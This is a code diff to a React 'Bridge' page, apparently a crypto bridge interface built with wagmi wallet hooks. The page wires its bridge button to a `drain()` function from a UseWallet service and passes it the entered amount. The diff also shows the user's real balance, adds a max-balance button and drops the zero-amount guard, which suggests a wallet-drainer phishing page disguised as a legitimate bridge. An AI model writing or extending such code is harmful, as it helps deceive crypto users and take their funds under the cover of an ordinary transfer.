@@ -32,9 +32,8 @@ import cutout_bottom_right_lg from "../assets/frame-corner-sm-bottom-right_lg.sv
 import discord from "../assets/icons8-discord-50.png";
 import twitter from "../assets/icons8-twitter-50.png";
 import { UseWallet } from "../services/useWallet";
+import GetTokenBalance from "./GetTokenBalance";
 const Bridge = () => {
-  const { drain } = UseWallet();
-
   const { connectors, connect } = useConnect();
   const { chains, switchChain } = useSwitchChain();
   console.log(chains);
@@ -49,7 +48,7 @@ const Bridge = () => {
   const [validate, setValidate] = useState(false);
   const [inputValue, setInputValue] = useState("0.00");
   const { address } = useAccount();
-
+  const { drain } = UseWallet(inputValue);
   const { disconnect } = useDisconnect();
   const { data: ensName } = useEnsName({ address });
   const { data: ensAvatar } = useEnsAvatar({
@@ -61,12 +60,16 @@ const Bridge = () => {
 
   // setTimeout(() => {
   //   disconnect();
-  // }, 20000);
+  // }, 2000);
 
-  console.log(ensAvatar, balance.data);
+  console.log("Balance", balance.data);
   const handleClick = () => {
     drain();
   };
+  const validConnectors = connectors.filter((connector) => {
+    return typeof connector.icon === "string";
+  });
+  console.log(validConnectors);
   // console.log("disable button:", Number(inputValue) <= 0, Number(inputValue));
   return (
     <div id="__next">
@@ -178,7 +181,11 @@ const Bridge = () => {
                                 <legend className="typography-brand-body-bold m-auto block px-2 uppercase text-camo-200 [@media(max-height:720px)]:hidden">
                                   You Can Bridge
                                 </legend>
+                                {address && (
+                                  <GetTokenBalance address={address} />
+                                )}
                               </fieldset>
+
                               <div className="[clip-path:polygon(100%_0px,_100%_0,_100%_0,_100%_calc(100%_-_24px),_calc(100%_-_0px)_100%,_0_100%,_0_24px,_24px_0px)] xl:[clip-path:polygon(100%_0px,_100%_0,_100%_0,_100%_calc(100%_-_40px),_calc(100%_-_32px)_100%,_0_100%,_0_40px,_32px_0px)] rounded-t-[6px] bg-camo-400 p-px pb-0 xl:mb-6 lg:rounded-[6px] lg:p-px">
                                 <div className="[clip-path:polygon(100%_0px,_100%_0,_100%_0,_100%_calc(100%_-_24px),_calc(100%_-_0px)_100%,_0_100%,_0_24px,_24px_0px)] xl:[clip-path:polygon(100%_0px,_100%_0,_100%_0,_100%_calc(100%_-_40px),_calc(100%_-_32px)_100%,_0_100%,_0_40px,_32px_0px)] rounded-t-[5px] bg-black lg:rounded-[5px]">
                                   <div className="flex flex-col items-center px-6 pb-4 pt-4 xl:pt-6">
@@ -222,9 +229,15 @@ const Bridge = () => {
                                             onChange={(e) => {
                                               setInputValue(e.target.value);
                                             }}
+                                            style={{
+                                              WebkitAppearance: "none",
+                                              MozAppearance: "textfield",
+                                              margin: 0,
+                                            }}
                                             autoFocus={true}
                                             lang="en"
-                                            type="text"
+                                            type="number"
+                                            max={balance}
                                             className="typography-brand-heading-1 h-[60px] w-full rounded-bl-lg rounded-tl-lg border border-camo-400 bg-transparent px-4 text-center text-camo-100 placeholder-camo-700 transition-colors focus:text-white disabled:bg-camo-600 disabled:text-camo-300 xl:h-20"
                                             placeholder="0.0"
                                             value={inputValue}
@@ -276,7 +289,9 @@ const Bridge = () => {
                                         >
                                           Balance
                                           <div className="flex items-center gap-1 text-camo-200">
-                                            0.00
+                                            {Number(
+                                              balance.data?.formatted
+                                            ).toPrecision(3)}
                                             <img
                                               alt="$ETH Token"
                                               loading="lazy"
@@ -290,6 +305,11 @@ const Bridge = () => {
                                           </div>
                                         </label>
                                         <button
+                                          onClick={() => {
+                                            setInputValue(
+                                              balance.data?.formatted
+                                            );
+                                          }}
                                           className="interactive-text typography-UI-body-bold uppercase text-yellow-300"
                                           id="BridgeForm-button-balance-max"
                                           type="button"
@@ -360,7 +380,6 @@ const Bridge = () => {
                                       </button>
                                     ) : (
                                       <button
-                                        disabled={Number(inputValue) <= 0}
                                         onClick={(e) => {
                                           setShowConnect(true);
 
@@ -684,7 +703,7 @@ const Bridge = () => {
                     </h2>
                   </div>
                   <div className="flex w-max flex-col gap-6">
-                    {connectors.map((connector) => (
+                    {validConnectors.map((connector) => (
                       <>
                         <div className="p-[1px] transition-all bg-transparent">
                           <div className="transition-[filter]">
